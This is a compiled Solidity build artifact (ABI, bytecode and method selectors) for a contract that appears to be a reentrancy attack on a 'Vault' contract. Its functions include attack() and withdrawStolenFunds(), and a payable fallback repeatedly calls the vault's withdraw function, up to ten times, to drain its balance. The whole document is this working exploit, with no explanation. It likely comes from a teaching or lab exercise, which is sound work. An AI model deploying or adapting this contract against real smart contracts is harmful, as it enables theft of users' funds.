{"abi":[{"type":"constructor","inputs":[{"name":"_vaultAddress","type":"address","internalType":"address payable"}],"stateMutability":"nonpayable"},{"type":"fallback","stateMutability":"payable"},{"type":"receive","stateMutability":"payable"},{"type":"function","name":"MAX_ATTACKS","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"attack","inputs":[],"outputs":[],"stateMutability":"payable"},{"type":"function","name":"attackCount","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"getAttackCount","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"getBalance","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"owner","inputs":[],"outputs":[{"name":"","type":"address","internalType":"address"}],"stateMutability":"view"},{"type":"function","name":"vault","inputs":[],"outputs":[{"name":"","type":"address","internalType":"contract Vault"}],"stateMutability":"view"},{"type":"function","name":"withdrawStolenFunds","inputs":[],"outputs":[],"stateMutability":"nonpayable"},{"type":"event","name":"AttackCompleted","inputs":[{"name":"totalStolen","type":"uint256","indexed":false,"internalType":"uint256"}],"anonymous":false},{"type":"event","name":"AttackStarted","inputs":[{"name":"initialBalance","type":"uint256","indexed":false,"internalType":"uint256"}],"anonymous":false},{"type":"event","name":"ReentrancyExecuted","inputs":[{"name":"amount","type":"uint256","indexed":false,"internalType":"uint256"},{"name":"count","type":"uint256","indexed":false,"internalType":"uint256"}],"anonymous":false}],"bytecode":{"object":"0x6080604052348015600e575f5ffd5b5060405161062c38038061062c833981016040819052602b916057565b5f80546001600160a01b039092166001600160a01b031992831617905560018054909116331790556082565b5f602082840312156066575f5ffd5b81516001600160a01b0381168114607b575f5ffd5b9392505050565b61059d8061008f5f395ff3fe60806040526004361061007e575f3560e01c8063b36303fe1161004d578063b36303fe146101ef578063e942550a14610203578063fbfa77cf14610217578063fd276754146102355761014d565b806312065fe01461017a578063407c28211461019b5780638da5cb5b146101b05780639e5faafc146101e75761014d565b3661014d57600a60025410801561009f57505f546001600160a01b03163115155b1561014b5760028054905f6100b383610543565b90915550506002546040805134815260208101929092527fe1cc25e5821b33a6d98d9ef7f86a3312600a5bbabd022d2e5a2535ceb56fb0b0910160405180910390a15f805460408051633ccfd60b60e01b815290516001600160a01b0390921692633ccfd60b9260048084019382900301818387803b158015610134575f5ffd5b505af1158015610146573d5f5f3e3d5ffd5b505050505b005b600a60025410801561009f57505f546001600160a01b0316311561014b5760028054905f6100b383610543565b348015610185575f5ffd5b50475b6040519081526020015b60405180910390f35b3480156101a6575f5ffd5b5061018860025481565b3480156101bb575f5ffd5b506001546101cf906001600160a01b031681565b6040516001600160a01b039091168152602001610192565b61014b610249565b3480156101fa575f5ffd5b50610188600a81565b34801561020e575f5ffd5b50600254610188565b348015610222575f5ffd5b505f546101cf906001600160a01b031681565b348015610240575f5ffd5b5061014b6103ee565b670de0b6b3a76400003410156102a65760405162461bcd60e51b815260206004820152601d60248201527f4e656564206174206c6561737420312045544820746f2061747461636b00000060448201526064015b60405180910390fd5b5f54670de0b6b3a76400006001600160a01b039091163110156102fc5760405162461bcd60e51b815260206004820152600e60248201526d5661756c7420697320656d70747960901b604482015260640161029d565b5f546040516001600160a01b039091163181527f33f040bcc293552b556fb3082b0e9fb26495aeae16ef365bd761c702978eec0a9060200160405180910390a15f805460408051630d0e30db60e41b815290516001600160a01b039092169263d0e30db0923492600480820193929182900301818588803b15801561037f575f5ffd5b505af1158015610391573d5f5f3e3d5ffd5b50505f805460408051633ccfd60b60e01b815290516001600160a01b039092169550633ccfd60b9450600480820194509082900301818387803b1580156103d6575f5ffd5b505af11580156103e8573d5f5f3e3d5ffd5b50505050565b6001546001600160a01b031633146104355760405162461bcd60e51b815260206004820152600a60248201526927b7363c9037bbb732b960b11b604482015260640161029d565b478061047a5760405162461bcd60e51b81526020600482015260146024820152734e6f2066756e647320746f20776974686472617760601b604482015260640161029d565b6040518181527f4ef6191345aae76824ed25ff5065e33a8fbbb5a05823ebba2291fc6237a925f99060200160405180910390a16001546040515f916001600160a01b03169083908381818185875af1925050503d805f81146104f7576040519150601f19603f3d011682016040523d82523d5f602084013e6104fc565b606091505b505090508061053f5760405162461bcd60e51b815260206004820152600f60248201526e151c985b9cd9995c8819985a5b1959608a1b604482015260640161029d565b5050565b5f6001820161056057634e487b7160e01b5f52601160045260245ffd5b506001019056fea2646970667358221220b461b542f296f2dde1f31ab3192d3b81d2973f3fb58c705881050e066044bf4664736f6c634300081e0033","linkReferences":{}},"methodIdentifiers":{"MAX_ATTACKS()":"b36303fe","attack()":"9e5faafc","attackCount()":"407c2821","getAttackCount()":"e942550a","getBalance()":"12065fe0","owner()":"8da5cb5b","vault()":"fbfa77cf","withdrawStolenFunds()":"fd276754"},"id":19}